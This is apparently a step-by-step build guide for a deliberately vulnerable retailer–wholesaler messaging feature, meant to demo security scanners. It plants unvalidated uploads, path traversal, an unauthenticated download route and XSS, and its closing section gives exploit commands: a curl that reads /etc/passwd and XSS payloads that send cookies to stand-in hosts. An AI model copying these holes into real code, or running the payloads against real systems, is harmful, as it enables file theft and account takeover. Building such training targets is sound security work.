# Phase 7 — Messaging & File Attachments

> **Goal:** Add order-scoped messaging between retailers and wholesalers, with file attachment support (invoices, shipping documents, photos). The chat lives inside the order detail page; messages are loaded via polling for a real-time feel without WebSocket complexity. By the end of this phase, both parties can communicate about an order and exchange files.

> **Estimated time:** 2–3 hours
> **Phase outcome:** Functional order messaging with attachments. Three new vulnerability classes planted (file upload validation, path traversal, XSS).

---

## What's Included in This Phase

1. Database: `Message` model linked to `Order`
2. Backend: send/list messages endpoints
3. Backend: file attachment upload + download endpoints
4. Backend: polling-friendly fetch (returns messages since timestamp)
5. Frontend: order detail page with chat UI
6. Frontend: file attachment send/receive
7. **Deliberate vulnerabilities:** missing MIME validation, path traversal in download, XSS in message rendering

---

## Step 7.1 — Database Schema

In `backend/prisma/schema.prisma`, add the `Message` model below `OrderItem`:

```prisma
model Message {
  id             String   @id @default(cuid())
  orderId        String
  order          Order    @relation(fields: [orderId], references: [id], onDelete: Cascade)
  senderId       String
  sender         User     @relation("MessageSender", fields: [senderId], references: [id])
  content        String
  attachmentUrl  String?
  attachmentName String?
  attachmentType String?
  createdAt      DateTime @default(now())

  @@index([orderId])
  @@index([senderId])
}
```

Add the back-references. Find the `Order` model and add:

```prisma
model Order {
  // ... existing fields ...

  messages       Message[]
}
```

Find the `User` model and add:

```prisma
model User {
  // ... existing fields ...

  sentMessages       Message[]  @relation("MessageSender")
}
```

Run the migration:

```bash
cd backend
npx prisma migrate dev --name add_messages
```

---

## Step 7.2 — Attachment Upload Configuration

Reuse the multer setup from Phase 3 with a new destination for message attachments.

**`backend/src/lib/messageUpload.ts`**
```typescript
import multer from "multer";
import path from "path";
import fs from "fs";

const UPLOAD_DIR = path.join(process.cwd(), "uploads", "messages");

if (!fs.existsSync(UPLOAD_DIR)) {
  fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}

const storage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, UPLOAD_DIR),
  filename: (_req, file, cb) => {
    // Preserve the original filename for user convenience
    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
    cb(null, uniqueSuffix + "-" + file.originalname);
  },
});

export const messageAttachmentUpload = multer({
  storage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10 MB
});
```

> ⚠️ **Deliberate vulnerability:** No MIME type validation, no extension whitelist. Any file type is accepted — including `.php`, `.html`, `.exe`, `.svg` (XSS vector). Aikido SAST flags this; AI Pentest exploits it.

---

## Step 7.3 — Message Service

**`backend/src/services/messageService.ts`**
```typescript
import { prisma } from "../lib/prisma.js";

interface SendMessageInput {
  orderId: string;
  senderId: string;
  content: string;
  attachmentUrl?: string;
  attachmentName?: string;
  attachmentType?: string;
}

export async function sendMessage(input: SendMessageInput) {
  return prisma.message.create({
    data: input,
    include: {
      sender: {
        select: { id: true, companyName: true, role: true },
      },
    },
  });
}

export async function listMessagesForOrder(orderId: string, since?: Date) {
  return prisma.message.findMany({
    where: {
      orderId,
      ...(since ? { createdAt: { gt: since } } : {}),
    },
    include: {
      sender: {
        select: { id: true, companyName: true, role: true },
      },
    },
    orderBy: { createdAt: "asc" },
  });
}

export async function getOrderForMessaging(orderId: string) {
  return prisma.order.findUnique({
    where: { id: orderId },
    select: {
      id: true,
      orderNumber: true,
      retailerId: true,
      wholesalerId: true,
      status: true,
    },
  });
}
```

---

## Step 7.4 — Message Controller

**`backend/src/controllers/messageController.ts`**
```typescript
import type { Response } from "express";
import path from "path";
import fs from "fs";
import type { AuthenticatedRequest } from "../middleware/authMiddleware.js";
import {
  sendMessage,
  listMessagesForOrder,
  getOrderForMessaging,
} from "../services/messageService.js";

export async function postMessage(req: AuthenticatedRequest, res: Response) {
  if (!req.user) return res.status(401).json({ error: "Not authenticated" });

  const { orderId, content } = req.body;
  if (!content && !req.file) {
    return res.status(400).json({ error: "Mesaj veya dosya gerekli" });
  }

  // Check the order exists; verify sender is involved in it
  const order = await getOrderForMessaging(orderId);
  if (!order) return res.status(404).json({ error: "Sipariş bulunamadı" });

  const isInvolved =
    order.retailerId === req.user.userId ||
    order.wholesalerId === req.user.userId;
  if (!isInvolved && req.user.role !== "ADMIN") {
    return res.status(403).json({ error: "Forbidden" });
  }

  let attachmentUrl: string | undefined;
  let attachmentName: string | undefined;
  let attachmentType: string | undefined;

  if (req.file) {
    attachmentUrl = `/api/messages/attachment/${req.file.filename}`;
    attachmentName = req.file.originalname;
    attachmentType = req.file.mimetype;
  }

  const message = await sendMessage({
    orderId,
    senderId: req.user.userId,
    content: content || "",
    attachmentUrl,
    attachmentName,
    attachmentType,
  });

  res.status(201).json(message);
}

export async function getOrderMessages(req: AuthenticatedRequest, res: Response) {
  if (!req.user) return res.status(401).json({ error: "Not authenticated" });

  const order = await getOrderForMessaging(req.params.orderId);
  if (!order) return res.status(404).json({ error: "Sipariş bulunamadı" });

  const isInvolved =
    order.retailerId === req.user.userId ||
    order.wholesalerId === req.user.userId;
  if (!isInvolved && req.user.role !== "ADMIN") {
    return res.status(403).json({ error: "Forbidden" });
  }

  const since = req.query.since
    ? new Date(req.query.since as string)
    : undefined;

  const messages = await listMessagesForOrder(req.params.orderId, since);
  res.json(messages);
}

// Download an attachment by filename
export async function downloadAttachment(req: AuthenticatedRequest, res: Response) {
  const { filename } = req.params;
  const filePath = path.join(process.cwd(), "uploads", "messages", filename);

  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: "Dosya bulunamadı" });
  }

  res.sendFile(filePath);
}
```

> ⚠️ **Deliberate vulnerability:**
>
> **Path traversal in `downloadAttachment`** — the `filename` parameter is appended directly to `path.join` without validation. A request like `/api/messages/attachment/..%2F..%2F..%2F..%2Fetc%2Fpasswd` allows reading arbitrary files from the server. AI Pentest catches this via fuzzing the attachment endpoint.

---

## Step 7.5 — Message Routes

**`backend/src/routes/messageRoutes.ts`**
```typescript
import { Router } from "express";
import { authenticate } from "../middleware/authMiddleware.js";
import { messageAttachmentUpload } from "../lib/messageUpload.js";
import {
  postMessage,
  getOrderMessages,
  downloadAttachment,
} from "../controllers/messageController.js";

export const messageRoutes = Router();

messageRoutes.post(
  "/messages",
  authenticate,
  messageAttachmentUpload.single("attachment"),
  postMessage
);

messageRoutes.get(
  "/orders/:orderId/messages",
  authenticate,
  getOrderMessages
);

// Attachment download is not behind authentication — anyone with the filename can fetch it.
// This is "by design" for convenience, e.g. when sharing invoice links externally.
messageRoutes.get("/messages/attachment/:filename", downloadAttachment);
```

> ⚠️ **Deliberate vulnerability:**
>
> **Unauthenticated attachment download** — combined with the path traversal above, this means anyone on the internet who can guess or find an attachment URL can fetch it. No session, no authorization check.

Update **`backend/src/app.ts`**:

```typescript
import { messageRoutes } from "./routes/messageRoutes.js";

// ... after existing routes ...
app.use("/api", messageRoutes);
```

---

## Step 7.6 — Test the Backend

Restart backend. You need an existing order between a retailer and a wholesaler (from Phase 5).

**Test 1 — Send a text message (as retailer):**

```bash
curl -X POST http://localhost:4000/api/messages \
  -H "Authorization: Bearer YOUR_RETAILER_TOKEN" \
  -F "orderId=ORDER_ID" \
  -F "content=Parça ne zaman kargolanacak?"
```

**Test 2 — Send a message with attachment (as wholesaler):**

Save a small test file (any image, e.g. `test.jpg`):

```bash
curl -X POST http://localhost:4000/api/messages \
  -H "Authorization: Bearer YOUR_WHOLESALER_TOKEN" \
  -F "orderId=ORDER_ID" \
  -F "content=Fatura ekte" \
  -F "attachment=@test.jpg"
```

**Test 3 — List messages for order:**

```bash
curl http://localhost:4000/api/orders/ORDER_ID/messages \
  -H "Authorization: Bearer YOUR_RETAILER_TOKEN"
```

You should see both messages, including the attachment URL.

**Test 4 — Download attachment (no auth):**

Take the `attachmentUrl` from the previous response and visit it directly in browser:

```
http://localhost:4000/api/messages/attachment/FILENAME_HERE
```

You should see/download the file with no auth challenge.

If all four work, the backend layer is done.

---

## Step 7.7 — Frontend: Messages API Client

**`frontend/src/api/messages.ts`**
```typescript
import { api } from "../lib/api";

export interface Message {
  id: string;
  orderId: string;
  senderId: string;
  content: string;
  attachmentUrl: string | null;
  attachmentName: string | null;
  attachmentType: string | null;
  createdAt: string;
  sender: {
    id: string;
    companyName: string;
    role: "RETAILER" | "WHOLESALER" | "ADMIN";
  };
}

export const messagesApi = {
  list: async (orderId: string, since?: Date): Promise<Message[]> => {
    const params: Record<string, string> = {};
    if (since) params.since = since.toISOString();
    const { data } = await api.get(`/orders/${orderId}/messages`, { params });
    return data;
  },

  send: async (
    orderId: string,
    content: string,
    attachment?: File
  ): Promise<Message> => {
    const formData = new FormData();
    formData.append("orderId", orderId);
    formData.append("content", content);
    if (attachment) formData.append("attachment", attachment);

    const { data } = await api.post("/messages", formData, {
      headers: { "Content-Type": "multipart/form-data" },
    });
    return data;
  },
};
```

---

## Step 7.8 — Frontend: Order Detail Page with Chat

**`frontend/src/pages/OrderDetailPage.tsx`**
```typescript
import { useEffect, useRef, useState } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { ordersApi, type Order } from "../api/orders";
import { messagesApi, type Message } from "../api/messages";
import { getCurrentUser } from "../lib/auth";

const API_URL = import.meta.env.VITE_API_URL || "http://localhost:4000";

export default function OrderDetailPage() {
  const user = getCurrentUser();
  const navigate = useNavigate();
  const { orderId } = useParams();

  const [order, setOrder] = useState<Order | null>(null);
  const [messages, setMessages] = useState<Message[]>([]);
  const [draft, setDraft] = useState("");
  const [attachment, setAttachment] = useState<File | null>(null);
  const [sending, setSending] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (!user || !orderId) {
      navigate("/login");
      return;
    }
    loadOrder();
    loadMessages();

    // Polling every 3 seconds for new messages
    const interval = setInterval(loadMessages, 3000);
    return () => clearInterval(interval);
  }, [orderId]);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages]);

  const loadOrder = async () => {
    if (!orderId) return;
    const o = await ordersApi.getOrder(orderId);
    setOrder(o);
  };

  const loadMessages = async () => {
    if (!orderId) return;
    const msgs = await messagesApi.list(orderId);
    setMessages(msgs);
  };

  const sendMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!orderId || (!draft && !attachment)) return;

    setSending(true);
    try {
      await messagesApi.send(orderId, draft, attachment || undefined);
      setDraft("");
      setAttachment(null);
      loadMessages();
    } finally {
      setSending(false);
    }
  };

  const handleBack = () => {
    if (user?.role === "RETAILER") navigate("/retailer/orders");
    else navigate("/wholesaler/orders");
  };

  if (!order || !user) return null;

  const counterparty =
    user.role === "RETAILER" ? order.wholesaler : order.retailer;

  return (
    <div className="min-h-screen p-8">
      <div className="max-w-4xl mx-auto">
        <button
          onClick={handleBack}
          className="text-sm text-slate-600 hover:text-slate-900 mb-4"
        >
          ← Siparişlere dön
        </button>

        <div className="bg-white rounded-2xl shadow p-6 mb-6">
          <div className="flex justify-between items-start mb-4">
            <div>
              <h1 className="text-2xl font-bold">{order.orderNumber}</h1>
              <p className="text-sm text-slate-500">
                {new Date(order.createdAt).toLocaleString("tr-TR")} ·{" "}
                {counterparty?.companyName}
              </p>
            </div>
            <span className="text-xs font-medium px-3 py-1 bg-slate-100 rounded-full">
              {order.status}
            </span>
          </div>

          <div className="border-t pt-4 space-y-2">
            {order.items.map((item) => (
              <div key={item.id} className="flex justify-between text-sm">
                <span>
                  {item.partBrand} — {item.partName}
                  <span className="text-slate-500 ml-2">× {item.quantity}</span>
                </span>
                <span>
                  {item.lineTotal} {order.currency}
                </span>
              </div>
            ))}
            <div className="flex justify-between font-bold pt-2 border-t">
              <span>Toplam</span>
              <span>
                {order.total} {order.currency}
              </span>
            </div>
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow overflow-hidden">
          <div className="px-5 py-3 border-b">
            <h2 className="font-bold">Mesajlar</h2>
            <p className="text-xs text-slate-500">
              {counterparty?.companyName} ile bu sipariş hakkındaki konuşma
            </p>
          </div>

          <div className="h-96 overflow-y-auto p-5 bg-slate-50">
            {messages.length === 0 ? (
              <p className="text-center text-slate-400 text-sm">
                Henüz mesaj yok. İlk mesajı sen gönder.
              </p>
            ) : (
              <div className="space-y-3">
                {messages.map((msg) => {
                  const isMine = msg.senderId === user.id;
                  return (
                    <div
                      key={msg.id}
                      className={`flex ${isMine ? "justify-end" : "justify-start"}`}
                    >
                      <div
                        className={`max-w-md rounded-2xl px-4 py-2 ${
                          isMine
                            ? "bg-blue-600 text-white"
                            : "bg-white border"
                        }`}
                      >
                        <p className="text-xs opacity-75 mb-1">
                          {msg.sender.companyName} ·{" "}
                          {new Date(msg.createdAt).toLocaleTimeString("tr-TR", {
                            hour: "2-digit",
                            minute: "2-digit",
                          })}
                        </p>
                        {/* Message content rendered with dangerouslySetInnerHTML for rich text support */}
                        <div
                          className="text-sm"
                          dangerouslySetInnerHTML={{ __html: msg.content }}
                        />
                        {msg.attachmentUrl && (
                          <a
                            href={`${API_URL}${msg.attachmentUrl}`}
                            target="_blank"
                            rel="noreferrer"
                            className={`block mt-2 text-xs underline ${
                              isMine ? "text-blue-100" : "text-blue-700"
                            }`}
                          >
                            📎 {msg.attachmentName}
                          </a>
                        )}
                      </div>
                    </div>
                  );
                })}
                <div ref={messagesEndRef} />
              </div>
            )}
          </div>

          <form onSubmit={sendMessage} className="border-t p-4">
            <div className="flex gap-2 mb-2">
              <input
                type="text"
                value={draft}
                onChange={(e) => setDraft(e.target.value)}
                placeholder="Mesaj yaz..."
                className="flex-1 border rounded p-2"
              />
              <button
                type="submit"
                disabled={sending || (!draft && !attachment)}
                className="bg-slate-900 text-white px-6 py-2 rounded font-medium disabled:opacity-50"
              >
                {sending ? "Gönderiliyor..." : "Gönder"}
              </button>
            </div>

            <div className="flex items-center gap-2">
              <input
                type="file"
                onChange={(e) => setAttachment(e.target.files?.[0] || null)}
                className="text-sm"
              />
              {attachment && (
                <span className="text-xs text-slate-500">
                  📎 {attachment.name}
                </span>
              )}
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
```

> ⚠️ **Deliberate vulnerability:**
>
> **XSS via `dangerouslySetInnerHTML`** — message content is rendered as raw HTML. A retailer can send `<img src=x onerror="fetch('//attacker.com?cookie='+document.cookie)">` and steal the wholesaler's session token when they view the message. AI Pentest fires on this immediately.

---

## Step 7.9 — Update Routing

**`frontend/src/App.tsx`** — add the new route:

```typescript
import OrderDetailPage from "./pages/OrderDetailPage";

// inside Routes:
<Route path="/orders/:orderId" element={<OrderDetailPage />} />
```

Now make the orders list clickable. Update **`frontend/src/pages/OrdersPage.tsx`** — wrap the order card in a clickable area:

Find the outer `<div key={order.id}>` inside the map and add an onClick handler:

```typescript
<div
  key={order.id}
  onClick={() => navigate(`/orders/${order.id}`)}
  className="bg-white rounded-2xl shadow overflow-hidden cursor-pointer hover:shadow-md transition"
>
```

Make sure the status transition buttons (Onayla, Kargola, Teslim Edildi) call `e.stopPropagation()` so the row click doesn't trigger:

```typescript
<button
  onClick={(e) => {
    e.stopPropagation();
    updateStatus(order.id, "CONFIRMED");
  }}
  ...
>
```

---

## Step 7.10 — End-to-End Test

1. Login as a retailer with an existing order (from Phase 5).
2. Open "Siparişlerim".
3. Click on an order card → should navigate to order detail page.
4. Order details should show at the top, messages section below.
5. Type "Parça ne zaman kargolanacak?" and click Gönder.
6. The message should appear on the right side (blue bubble).
7. Logout, login as the wholesaler that received this order.
8. Open "Siparişler", click the same order.
9. You should see the retailer's message on the left side (white bubble).
10. Reply with a text and attach a small image file.
11. The attachment should appear as a clickable 📎 link.
12. Click the attachment link → it should open/download.
13. Back as the retailer, the page should auto-poll and show the wholesaler's response within 3 seconds.

✅ If all of this works, Phase 7 is complete.

---

## Step 7.11 — Commit

```bash
git add .
git commit -m "feat: phase 7 order messaging and file attachments"
```

Update `NOTES.md`.

---

## Phase 7 — Verification Checklist

- [ ] `Message` table exists
- [ ] Backend send message endpoint works (text + attachment)
- [ ] Backend list messages endpoint works
- [ ] Backend attachment download endpoint serves files
- [ ] Frontend order detail page loads with chat UI
- [ ] Messages appear in correct alignment (sender's side)
- [ ] File attachments render as clickable links
- [ ] Polling refreshes messages every 3 seconds
- [ ] Status transition buttons still work from order list (don't trigger row navigation)
- [ ] Phase 7 changes committed

---

## Deliberate Vulnerabilities Introduced in Phase 7

| # | Location | Vulnerability | Aikido module that catches it |
|---|----------|---------------|-------------------------------|
| 1 | `backend/src/lib/messageUpload.ts` | No MIME type or extension validation on uploads | SAST + AI Pentest |
| 2 | `backend/src/controllers/messageController.ts` `downloadAttachment` | Path traversal — filename appended to path without sanitization | SAST + AI Pentest (similar to ACME PT-5) |
| 3 | `backend/src/routes/messageRoutes.ts` | Attachment download endpoint not behind authentication | AI Pentest |
| 4 | `frontend/src/pages/OrderDetailPage.tsx` | XSS via `dangerouslySetInnerHTML` on message content | SAST + AI Pentest |

---

## How to Exploit Each (for Demo)

**Path traversal — read system files:**

```bash
curl "http://localhost:4000/api/messages/attachment/..%2F..%2F..%2F..%2Fetc%2Fpasswd"
```

Returns the contents of `/etc/passwd`. On a real production server, this is catastrophic — config files, source code, AWS credentials all exposed. This is the same vulnerability class as ACME PT-5 (Read_file via Chat API).

**Unauthenticated download — guess attachment URLs:**

```bash
# After someone uploads, the filename pattern is: <timestamp>-<random>-<originalname>
# An attacker can fetch any attachment without authentication
curl http://localhost:4000/api/messages/attachment/FILENAME_FROM_ANYWHERE
```

If invoices or contracts are exchanged, those become publicly accessible.

**Malicious file upload:**

```bash
# Upload a fake "invoice" that's actually an HTML file with embedded JavaScript
echo '<script>alert("XSS via SVG")</script>' > evil.svg
curl -X POST http://localhost:4000/api/messages \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -F "orderId=ORDER_ID" \
  -F "content=Fatura ekte" \
  -F "attachment=@evil.svg"
```

When the recipient clicks the attachment link, the SVG opens and the script executes in the application's origin. Browser policies should block some of this, but with no Content-Type validation the server happily serves the file with whatever MIME the browser interprets.

**XSS via message content:**

Send this as a message:

```html
<img src=x onerror="fetch('//attacker.test/?stolen=' + document.cookie)">
```

When the other party views the order, the image fails to load, the `onerror` handler fires, and their session cookie is sent to `attacker.test`. Account takeover via a chat message. Aikido's SAST flags `dangerouslySetInnerHTML` directly; AI Pentest demonstrates the exploit live.

These four exploits together demonstrate why chat/messaging features in B2B platforms are a frequent compromise vector — and why Aikido's combined SAST + AI Pentest coverage matters.

---

## What Comes Next

**Phase 8 — Docker & Containerization:**
- Dockerfile for backend (multi-stage build)
- Dockerfile for frontend (Nginx serve)
- docker-compose for full local stack
- Health checks
- Production-style environment variables

Deliberate vulnerabilities to come:
- Container runs as root user
- Base image is outdated (Node 16 EOL)
- Hardcoded environment variables in Dockerfile
- Exposed sensitive ports

When you're ready, request `phase-08-docker.md`.
